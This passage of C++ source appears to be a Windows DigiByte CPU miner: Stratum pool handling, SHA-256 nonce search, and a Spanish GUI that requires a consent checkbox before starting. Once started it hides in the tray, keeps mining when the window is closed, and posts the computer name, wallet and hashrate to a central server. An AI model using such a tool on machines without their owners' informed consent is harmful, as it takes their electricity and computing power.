                    "/" + std::to_string(ntB.size()) + "/" + std::to_string(nbB.size()));
                idleTicks = 0;
            } else if (method == "mining.set_difficulty" && params && params->at(0)) {
                double d = params->at(0)->number();
                if (d > 0) { diff = d; updateTarget(); }
            } else if (method == "mining.set_target" && params && params->at(0)) {
                std::vector<uint8_t> t = unhex(params->at(0)->str());
                if (t.size() == 32) {
                    std::reverse_copy(t.begin(), t.end(), target);
                    refreshTargetWords();
                }
            } else if (method == "mining.ping") {
                const JVal* id = j.get("id");
                char b[32];
                std::snprintf(b, sizeof(b), "%s", id ? std::to_string(uint64_t(id->number())).c_str() : "0");
                sendLine(std::string("{\"id\":") + b + ",\"result\":null,\"error\":null}");
            }
            return;
        }
        const JVal* idv = j.get("id");
        if (!idv) return;
        uint64_t id = uint64_t(idv->number());
        if (id == 1) {
            const JVal* res = j.get("result");
            const JVal* err = j.get("error");
            if (err && err->t != JVal::Null) { subscribeOk = false; return; }
            if (res && res->t == JVal::Arr) {
                const JVal* e1 = res->at(res->at(0) && res->at(0)->t == JVal::Arr ? 1 : 0);
                const JVal* es = res->at(res->at(0) && res->at(0)->t == JVal::Arr ? 2 : 1);
                if (e1) ex1 = unhex(e1->str());
                if (es) ex2size = std::max(1, std::min(16, int(es->number())));
                ex2.assign(size_t(ex2size), 0);
                subscribeOk = !ex1.empty();
                updateTarget();
            }
        } else if (id == 2) {
            const JVal* res = j.get("result");
            const JVal* err = j.get("error");
            authOk = res && res->t == JVal::Bool && res->b && (!err || err->t == JVal::Null);
        } else if (id >= 1000) {
            const JVal* err = j.get("error");
            if (err && err->t != JVal::Null) rejected++; else accepted++;
        }
    }

    int ex2size = 4;

    void refreshTargetWords() {
        for (int i = 0; i < 8; ++i)
            targetW[i] = (uint32_t(target[4*i]) << 24) | (uint32_t(target[4*i+1]) << 16) |
                         (uint32_t(target[4*i+2]) << 8) | uint32_t(target[4*i+3]);
    }

    void updateTarget() {
        // target = diff1_target / diff. diff1 target big-endian: 00 00 00 00 FF FF 00 00...
        uint8_t be[32]{};
        be[4] = 0xFF; be[5] = 0xFF;
        // multiply by 2^16
        for (int i = 0; i < 30; ++i) be[i] = be[i+2];
        be[30] = be[31] = 0;
        uint32_t div = uint32_t(diff * 65536.0);
        if (div < 1) div = 1;
        uint64_t rem = 0;
        for (int i = 0; i < 32; ++i) {
            rem = (rem << 8) | be[i];
            be[i] = uint8_t(rem / div);
            rem %= div;
        }
        for (int i = 0; i < 32; ++i) target[i] = be[31-i];
        refreshTargetWords();
    }

    void pumpMessages() {
        std::string line;
        for (int i = 0; i < 64 && readLine(line, 0); ++i) handle(line);
    }

    void mineOne(uint32_t& nonce, std::mt19937& rng) {
        std::vector<uint8_t> cb = cb1;
        cb.insert(cb.end(), ex1.begin(), ex1.end());
        cb.insert(cb.end(), ex2.begin(), ex2.end());
        cb.insert(cb.end(), cb2.begin(), cb2.end());

        uint8_t cbh[32];
        SHA256::dhash(cb.data(), cb.size(), cbh);
        uint8_t mr[32];
        std::memcpy(mr, cbh, 32);
        uint8_t pair[64];
        for (const auto& b : merkle) {
            if (b.size() != 32) continue;
            std::memcpy(pair, mr, 32);
            std::memcpy(pair + 32, b.data(), 32);
            SHA256::dhash(pair, 64, mr);
        }

        uint8_t hdr[80]{};
        std::memcpy(hdr, verB.data(), 4);
        std::memcpy(hdr + 4, prevB.data(), 32);
        std::memcpy(hdr + 36, mr, 32);
        std::memcpy(hdr + 68, ntB.data(), 4);
        std::memcpy(hdr + 72, nbB.data(), 4);

        // Primer bloque del primer SHA-256 es fijo durante todo el trabajo.
        uint32_t state1[8];
        SHA256::compress(SHA256::IV, hdr, state1);

        // Segundo bloque del primer SHA-256: 16 bytes de cabecera + padding.
        uint8_t block2[64]{};
        std::memcpy(block2, hdr + 64, 12);
        block2[16] = 0x80;
        block2[62] = 0x02;
        block2[63] = 0x80;

        // Unico bloque del segundo SHA-256: 32 bytes de digest + padding.
        uint8_t block3[64]{};
        block3[32] = 0x80;
        block3[62] = 0x01;

        constexpr int kBatch = 8192;
        int done = 0;
        for (; done < kBatch && !stop && haveJob; ++done) {
            uint32_t used = nonce++;
            block2[12] = uint8_t(used);
            block2[13] = uint8_t(used >> 8);
            block2[14] = uint8_t(used >> 16);
            block2[15] = uint8_t(used >> 24);

            uint32_t h1[8];
            SHA256::compress(state1, block2, h1);
            for (int i = 0; i < 8; ++i) {
                block3[4*i]   = uint8_t(h1[i] >> 24);
                block3[4*i+1] = uint8_t(h1[i] >> 16);
                block3[4*i+2] = uint8_t(h1[i] >> 8);
                block3[4*i+3] = uint8_t(h1[i]);
            }
            uint32_t h2[8];
            SHA256::compress(SHA256::IV, block3, h2);

            bool ok = true;
            for (int i = 0; i < 8; ++i) {
                if (h2[i] < targetW[i]) { ok = true; break; }
                if (h2[i] > targetW[i]) { ok = false; break; }
            }
            if (!ok) continue;

            uint8_t nbBytes[4]{};
            std::memcpy(nbBytes, ntB.data(), 4);
            std::string nb = hexOf(nbBytes, 4);
            uint8_t nonceBytes[4] = {
                uint8_t(used), uint8_t(used >> 8),
                uint8_t(used >> 16), uint8_t(used >> 24)
            };
            std::string nh = hexOf(nonceBytes, 4);
            std::string params = "[\"" + jsonEscape(user) + "\",\"" + jobId + "\",\"" +
                                 ex2Hex + "\",\"" + nb + "\",\"" + nh + "\"]";
            rpcSend(msgId, "mining.submit", params);
            msgId++;
            idleTicks = 0;
            for (auto& x : ex2) x = uint8_t(rng() & 0xff);
            ex2Hex = hexOf(ex2.data(), ex2.size());
            hashes.fetch_add(static_cast<uint64_t>(done + 1));
            return;
        }
        hashes.fetch_add(static_cast<uint64_t>(done));
    }
};

// ---------------- globals / GUI ----------------

Config g_cfg;
std::vector<Worker*> g_workers;
std::vector<std::thread> g_threads;
std::atomic<bool> g_running{false};
std::thread g_stats;
HWND g_hwnd{}, g_start{}, g_stop{}, g_accept{}, g_status{}, g_info{};
NOTIFYICONDATAW g_nid{};
bool g_tray = false;
bool g_exit = false;

std::string localComputerName() {
    wchar_t name[256]{};
    DWORD n = 256;
    if (GetComputerNameW(name, &n)) return wideToUtf8(std::wstring(name, n));
    return "pc";
}

bool httpPost(const std::wstring& url, const std::string& body) {
    URL_COMPONENTS uc{}; uc.dwStructSize = sizeof(uc);
    wchar_t host[256]{}; wchar_t path[2048]{};
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path; uc.dwUrlPathLength = 2048;
    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &uc)) return false;
    HINTERNET session = WinHttpOpen(L"DgbMiner/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, nullptr, nullptr, 0);
    if (!session) return false;
    HINTERNET conn = WinHttpConnect(session, host, uc.nPort, 0);
    if (!conn) { WinHttpCloseHandle(session); return false; }
    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    std::wstring p = path[0] ? path : L"/";
    HINTERNET req = WinHttpOpenRequest(conn, L"POST", p.c_str(), nullptr, nullptr, nullptr, flags);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(session); return false; }
    WinHttpSetTimeouts(req, 3000, 3000, 3000, 3000);
    const wchar_t* hdr = L"Content-Type: application/json\r\n";
    BOOL ok = WinHttpSendRequest(req, hdr, DWORD(-1), const_cast<char*>(body.data()),
                                 DWORD(body.size()), DWORD(body.size()), 0);
    if (ok) ok = WinHttpReceiveResponse(req, nullptr);
    WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(session);
    return ok != FALSE;
}

void statsLoop() {
    uint64_t prevHash = 0;
    while (g_running) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
        if (!g_running) break;
        uint64_t total = 0, acc = 0, rej = 0;
        for (Worker* w : g_workers) {
            total += w->hashes.load();
            acc += w->accepted.load();
            rej += w->rejected.load();
        }
        double hr = double(total - prevHash) / 5.0;
        prevHash = total;
        std::string payload = "{\"coin\":\"DGB\",\"rig\":\"" + jsonEscape(localComputerName()) + "\","
            "\"hashrate\":" + std::to_string(hr) + ",\"hashes\":" + std::to_string(total) + ","
            "\"shares\":" + std::to_string(acc) + ",\"rejected\":" + std::to_string(rej) + ","
            "\"uptime\":0,\"mined_dgb\":0,\"wallet\":\"" + jsonEscape(wideToUtf8(g_cfg.wallet)) + "\","
            "\"worker\":\"" + jsonEscape(wideToUtf8(g_cfg.worker)) + "\",\"ts\":0}";
        httpPost(g_cfg.server, payload);
    }
}

void writeNoticeLog() {
    wchar_t dir[MAX_PATH]{};
    GetModuleFileNameW(nullptr, dir, MAX_PATH);
    std::wstring p(dir);
    size_t slash = p.find_last_of(L"\\/");
    if (slash != std::wstring::npos) p = p.substr(0, slash + 1);
    p += L"aviso_mineria.log";
    std::wofstream f(p, std::ios::app);
    auto now = std::chrono::system_clock::now();
    std::time_t t = std::chrono::system_clock::to_time_t(now);
    char tb[32]; std::strftime(tb, sizeof(tb), "%Y-%m-%d %H:%M:%S", std::localtime(&t));
    f << L"[" << tb << L"] AVISO: minado DGB iniciado. pool=" << g_cfg.pool
      << L" wallet=" << g_cfg.wallet << L" worker=" << g_cfg.worker
      << L" threads=" << g_cfg.threads << L"\n";
}

void setStatus(const wchar_t* s) { if (g_status) SetWindowTextW(g_status, s); }

void startMining();
void stopMining();

std::wstring infoText() {
    return L"AVISO DE MINERÍA DIGIBYTE (DGB)\n"
           L"Este equipo va a usar su CPU para minar DGB y enviar el resultado a TU wallet.\n"
           L"Wallet: " + g_cfg.wallet + L"\nPool: " + g_cfg.pool +
           L"\nWorker: " + g_cfg.worker + L"\nHilos: " + std::to_wstring(g_cfg.threads) +
           L"\nEl consumo de CPU y electricidad corre por cuenta de este equipo.\n"
           L"Al marcar la casilla empieza a minar y se oculta en la bandeja.\n"
           L"Clic derecho en el icono para ver estado o detenerlo.";
}

void addTray() {
    if (g_tray) return;
    g_nid.cbSize = sizeof(g_nid);
    g_nid.hWnd = g_hwnd;
    g_nid.uID = 1;
    g_nid.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    g_nid.uCallbackMessage = kTrayMsg;
    g_nid.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    std::wstring tip = L"Minero DGB - " + g_cfg.wallet.substr(0, 12) + L"... (clic derecho)";
    wcsncpy_s(g_nid.szTip, tip.c_str(), _TRUNCATE);
    if (Shell_NotifyIconW(NIM_ADD, &g_nid)) g_tray = true;

    g_nid.uFlags |= NIF_INFO;
    wcscpy_s(g_nid.szInfoTitle, L"Minero DGB en segundo plano");
    wcscpy_s(g_nid.szInfo, L"Marcaste el aviso. El minado sigue activo. Clic derecho aqui para detenerlo.");
    g_nid.dwInfoFlags = NIIF_INFO;
    Shell_NotifyIconW(NIM_MODIFY, &g_nid);
    g_nid.uFlags &= ~NIF_INFO;
}

void removeTray() {
    if (!g_tray) return;
    Shell_NotifyIconW(NIM_DELETE, &g_nid);
    g_tray = false;
}

void minimizeToTray() {
    ShowWindow(g_hwnd, SW_HIDE);
    addTray();
}

void restoreFromTray() {
    ShowWindow(g_hwnd, SW_SHOW);
    SetForegroundWindow(g_hwnd);
}

void showTrayMenu() {
    HMENU menu = CreatePopupMenu();
    if (!menu) return;
    AppendMenuW(menu, MF_STRING, kIdTrayRestore, L"Ver estado / restaurar");
    AppendMenuW(menu, MF_STRING, kIdTrayStop, g_running ? L"Detener minado" : L"Iniciar minado");
    AppendMenuW(menu, MF_SEPARATOR, 0, nullptr);
    AppendMenuW(menu, MF_STRING, kIdTrayExit, L"Salir y detener todo");
    POINT p{};
    GetCursorPos(&p);
    SetForegroundWindow(g_hwnd);
    UINT cmd = TrackPopupMenu(menu, TPM_RIGHTBUTTON | TPM_RETURNCMD,
                              p.x, p.y, 0, g_hwnd, nullptr);
    DestroyMenu(menu);
    PostMessageW(g_hwnd, WM_NULL, 0, 0);
    if (cmd == kIdTrayRestore) restoreFromTray();
    else if (cmd == kIdTrayStop) {
        if (g_running) stopMining(); else startMining();
    } else if (cmd == kIdTrayExit) {
        g_exit = true;
        stopMining();
        PostMessageW(g_hwnd, WM_CLOSE, 0, 0);
    }
}

void startMining() {
    if (g_running) return;
    if (SendMessageW(g_accept, BM_GETCHECK, 0, 0) != BST_CHECKED) {
        setStatus(L"Marcá el aviso/consentimiento para iniciar.");
        return;
    }
    g_cfg = loadConfig();
    if (g_info) SetWindowTextW(g_info, infoText().c_str());
    if (g_cfg.wallet.empty() || g_cfg.wallet.rfind(L"FILL:", 0) == 0) {
        setStatus((L"Falta la wallet. Editá: " + configPath()).c_str());
        return;
    }
    if (g_cfg.pool.empty() || g_cfg.pool.find(L"example.invalid") != std::wstring::npos) {
        setStatus((L"Falta el pool. Editá: " + configPath()).c_str());
        return;
    }
    g_workers.clear();
    for (int i = 0; i < g_cfg.threads; ++i) g_workers.push_back(new Worker(i, g_cfg));
    g_running = true;
    for (Worker* w : g_workers) g_threads.emplace_back([w] { w->run(); });
    g_stats = std::thread(statsLoop);
    writeNoticeLog();
    EnableWindow(g_start, FALSE);
    EnableWindow(g_stop, TRUE);
    setStatus(L"MINANDO DGB en segundo plano. Icono en la bandeja para detener.");
    minimizeToTray();
}

void stopMining() {
    if (!g_running) return;
    g_running = false;
    for (Worker* w : g_workers) w->stop = true;
    for (auto& t : g_threads) if (t.joinable()) t.join();
    g_threads.clear();
    if (g_stats.joinable()) g_stats.join();
    for (Worker* w : g_workers) delete w;
    g_workers.clear();
    removeTray();
    EnableWindow(g_start, TRUE);
    EnableWindow(g_stop, FALSE);
    setStatus(L"Detenido. No queda ningún proceso minando.");
    if (!g_exit) restoreFromTray();
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE: {
        g_cfg = loadConfig();
        std::wstring info = infoText();
        g_info = CreateWindowExW(0, L"STATIC", info.c_str(),
            WS_CHILD | WS_VISIBLE | SS_LEFT, 16, 14, 620, 120, hwnd, nullptr, nullptr, nullptr);
        g_accept = CreateWindowExW(0, L"BUTTON",
            L"Acepto minar DGB en este equipo con la wallet indicada (aviso leído)",
            WS_CHILD | WS_VISIBLE | BS_AUTOCHECKBOX, 16, 145, 620, 26, hwnd,
            reinterpret_cast<HMENU>(static_cast<ULONG_PTR>(kIdCheckbox)), nullptr, nullptr);
        g_start = CreateWindowExW(0, L"BUTTON", L"Aceptar y ocultar",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 16, 185, 140, 32, hwnd,
            reinterpret_cast<HMENU>(1), nullptr, nullptr);
        g_stop = CreateWindowExW(0, L"BUTTON", L"Detener",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 170, 185, 140, 32, hwnd,
            reinterpret_cast<HMENU>(2), nullptr, nullptr);
        CreateWindowExW(0, L"BUTTON", L"Recargar config",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, 320, 185, 130, 32, hwnd,
            reinterpret_cast<HMENU>(static_cast<ULONG_PTR>(kIdReload)), nullptr, nullptr);
        g_status = CreateWindowExW(0, L"STATIC", (L"Config usada: " + configPath()).c_str(),
            WS_CHILD | WS_VISIBLE | SS_LEFT, 16, 232, 620, 28, hwnd, nullptr, nullptr, nullptr);
        EnableWindow(g_stop, FALSE);
        return 0;
    }
    case WM_COMMAND:
        switch (LOWORD(wp)) {
        case 1: startMining(); break;
        case 2: stopMining();  break;
        case kIdReload:
            g_cfg = loadConfig();
            if (g_info) SetWindowTextW(g_info, infoText().c_str());
            setStatus((L"Config recargada: " + configPath()).c_str());
            break;
        case kIdCheckbox:
            if (HIWORD(wp) == BN_CLICKED &&
                SendMessageW(g_accept, BM_GETCHECK, 0, 0) == BST_CHECKED) {
                startMining();
            }
            break;
        }
        return 0;
    case kTrayMsg:
        if (LOWORD(lp) == WM_RBUTTONUP) showTrayMenu();
        else if (LOWORD(lp) == WM_LBUTTONDBLCLK) restoreFromTray();
        return 0;
    case WM_CLOSE:
        if (g_running && !g_exit) { minimizeToTray(); return 0; }
        stopMining();
        DestroyWindow(hwnd);
        return 0;
    case WM_DESTROY:
        removeTray();
        PostQuitMessage(0);
        return 0;
    default:
        return DefWindowProcW(hwnd, msg, wp, lp);
    }
}

} // namespace

int WINAPI wWinMain(HINSTANCE hInst, HINSTANCE, PWSTR, int) {
    WNDCLASSW wc{};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInst;
    wc.lpszClassName = kClass;
    wc.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
    if (!RegisterClassW(&wc)) return 1;
    HWND hwnd = CreateWindowExW(0, kClass, kTitle, WS_OVERLAPPEDWINDOW | WS_VISIBLE,
        CW_USEDEFAULT, CW_USEDEFAULT, 660, 310, nullptr, nullptr, hInst, nullptr);
    if (!hwnd) return 1;
    g_hwnd = hwnd;
    MSG msg{};
    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }
    return 0;
}
